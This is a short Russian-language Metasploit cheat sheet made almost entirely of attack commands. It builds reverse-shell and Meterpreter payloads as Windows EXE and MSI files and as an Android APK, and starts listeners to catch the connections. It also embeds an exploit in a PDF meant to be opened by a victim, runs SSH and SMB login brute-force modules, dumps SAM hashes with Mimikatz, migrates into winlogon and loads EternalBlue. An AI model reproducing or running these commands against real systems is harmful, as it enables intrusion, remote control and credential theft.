# MetaSploit

searchsploit desctop control   поиск эксплойта для названия

Создаем реверс шелл для виндовс

https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/

c meterpreter сессией

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe


проверено для netcat и для метасплойт

msfvenom -p windows/shell_reverse_tcp LHOST=10.18.35.17 LPORT=7777 -f exe -o Zero.exe

msfvenom –platform windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.8.0.28 LPORT=4444 -f msi -o tmp/rev.msi



Включаем хендлер

rlwrap nc -lvnp 7777

вместо неткат для метасплойт

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set payload windows/x64/meterpreter_reverse_tcp

set PAYLOAD windows/x64/shell_reverse_tcp

Миграция в процесс

migrate -N winlogon.exe

Для АНДРОИД

msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport= 5555 R> Test.apk

Эксплоит в PDF​
Так же для фреймворка не составит труда сгенерировать PDF файл с полезной нагрузкой и аналогичным образом подключиться к нему. Давайте же приступим!

Здесь уже msfvenom нам не понадобиться, будем всё делать прямиком в метасплоите, поэтому снова его запускаем msfconsole.

Далее прописываем вот такие команды:

Код:

use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs


Здесь будет задействован эксполит, который будет встроен в PDF файл

Код:

set lhost 192.168.0.9

set lport 4444

set filename Test3.pdf


Здесь задаём имя нашему файлу


Для брута use auxiliary/scanner/ssh/ssh_login

use auxiliary/scanner/smb/smb_login
set rhost
set 
МИМИКАТЗ в метасплойт

kiwi_cmd lsadump::sam

Поиск уязвимостей ядра

(в метерпретер-сессии)

run post/multi/recon/local_exploit_suggester


eternalblue в метасплойт

use exploit/windows/smb/ms17_010_eternalblue
   show payloads
